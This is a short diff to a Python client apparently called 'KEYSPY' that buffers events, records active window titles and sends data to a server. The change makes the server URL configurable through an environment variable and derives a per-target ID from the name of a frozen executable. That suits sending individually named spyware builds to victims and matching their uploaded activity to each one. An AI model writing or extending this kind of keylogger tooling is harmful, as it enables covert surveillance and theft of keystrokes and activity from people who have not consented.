@@ -5,6 +5,8 @@ import json
 import threading
 import requests
 import atexit
+import os
+import sys
 
 send_time = 60
 event_buffer = []
@@ -16,8 +18,16 @@ def get_active_window():
     return title.split(" - ")[-1] if title else "Unknown"
 
 
-SERVER = "http://127.0.0.1:8000"
-USER_UUID = "a3f8c2d1-1234-5678-abcd-ef0123456789"
+SERVER = os.getenv("KEYSPY_SERVER_URL", "http://127.0.0.1:8000")
+
+def get_uuid():
+    filename = os.path.splitext(os.path.basename(sys.executable if getattr(sys, 'frozen', False) else __file__))[0]
+    parts = filename.split('_', 1)
+    if len(parts) == 2:
+        return parts[1]
+    return filename
+
+USER_UUID = get_uuid()
 HEADERS = {"X-User-UUID": USER_UUID}
 
 
